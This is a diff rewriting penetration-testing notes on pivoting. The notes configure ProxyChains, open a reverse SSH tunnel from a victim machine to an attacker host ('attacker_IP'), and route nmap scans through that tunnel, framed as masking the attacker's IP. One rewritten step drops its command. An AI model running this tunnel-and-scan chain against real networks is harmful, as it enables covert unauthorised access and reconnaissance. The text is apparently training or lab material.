@@ -1,24 +1,35 @@
-Comment strictchain and uncomment dynamicchain. Uncomment quitemode. Comment proxydns. Then change the default config at the bottom from socks4 127.0.0.1 9080 to socks5 and whatever port you want to use.
+Configuring ProxyChains for Enhanced Anonymity
+Pre-requisites:
+Ensure xclip is installed for RDP functionality.
+On the Attacker Box:
+1. Edit ProxyChains Configuration
+If you haven't already configured ProxyChains, open the configuration file with:
+sudo nano /etc/proxychains4.conf
+Modify ProxyChains Configuration:
+Comment out strict_chain
+Uncomment dynamic_chain
+Uncomment quiet_mode
+Comment proxy_dns
+Change the Default Config
+from socks4 127.0.0.1 9080 to socks5 127.0.0.1 [YourPreferredPort] where [YourPreferredPort] is the port number you choose.
 
-Note: For RDP, make sure xclip is installed.
+2. Verify SSH Service Status and Start if Necessary
+Check if SSH service is running:
+sudo systemctl status ssh.service
+f the SSH service is not started, start it with:
+3. Configure Port Forwarding Rule on pfSense
+This step is crucial for setting up a tunnel from the victim machine back to the attacker's machine.
 
-On Attacker Box
-Open /etc/proxychains4.conf.
+4. Establish SSH Tunnel from Victim Machine
+On the victim's machine, run:
+ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port
+Note: This command will not produce output. Verify the connection by checking open ports on the attacker machine.
 
-!!! SKIP NEXT STEP IF YOU CONFIGURED PROXY CHAINS ALREADY !!!
-(ATTACKER) sudo nano /etc/proxychains4.conf
-
-(ATTACKER) netstat -napt (set up listener over ssh)
-
-(ATTACKER) sudo systemctl status ssh.service
-
-(ATTACKER) sudo systemctl start ssh.service (check if started)
-
-configure Port Fowarding rule pn pfsense
-
-(VICTIM) ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port * (this command wont show you anything go back to kali and run net stat, port shoud be open now) 
-(refrence wiki for screenshots)
-
-(since the proxy is now available to us we will wrap nmap inside proxychains)
+5. Use ProxyChains to Route Traffic through the SSH Tunnel
+To perform an Nmap scan through the proxy, use:
 sudo proxychains nmap -iL scope -F -sT -Pn | tee fast_scan
-(we are listening over ssh we are not manipulating the port we are manipulating the port fowarding rule)
+This step ensures that the scanning traffic is routed through the established SSH tunnel, leveraging the port forwarding rule for anonymity.
+
+Additional Notes:
+Ensure to refer to the wiki for screenshots and more detailed steps if necessary.
+The process involves setting up an SSH tunnel from the victim machine to the attacker's machine, thereby allowing the attacker to route traffic (such as Nmap scans) through the tunnel, effectively masking their true IP address.
